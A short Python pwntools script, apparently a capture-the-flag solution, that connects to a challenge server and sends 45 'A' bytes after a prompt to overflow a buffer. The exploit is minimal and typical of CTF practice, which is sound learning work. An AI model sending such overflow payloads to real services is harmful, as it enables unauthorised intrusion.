from pwn import *

# context.log_level = "debug"

p = remote("pwn.server.io", 31140)

p.sendlineafter(b"The penguins are watching: ", b"A"*0x2d)

print(p.recv())